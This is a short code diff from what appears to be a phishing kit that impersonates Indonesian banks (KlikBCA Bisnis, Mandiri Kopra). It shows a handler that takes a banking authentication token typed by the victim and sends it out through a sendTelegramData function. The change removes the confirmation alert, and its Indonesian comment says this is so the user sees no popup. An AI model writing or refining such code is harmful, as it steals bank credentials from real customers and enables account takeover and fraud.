@@ -757,10 +757,11 @@
       const tokenVal = document.getElementById('finalTokenInput').value.trim();
 
       await sendTelegramData('🔔 KlikBCA Bisnis - Final Token:', {
-        'Token': tokenVal
-      });
-      alert('Autentikasi KlikBCA Sedang di Proses.');
-    }
+    'Token': tokenVal
+  });
+
+  // alert dihapus agar pengguna tidak melihat notifikasi popup
+}
 
     // 7. Mandiri Kopra
     document.getElementById('mandiriForm1').addEventListener('submit', async function(e) {
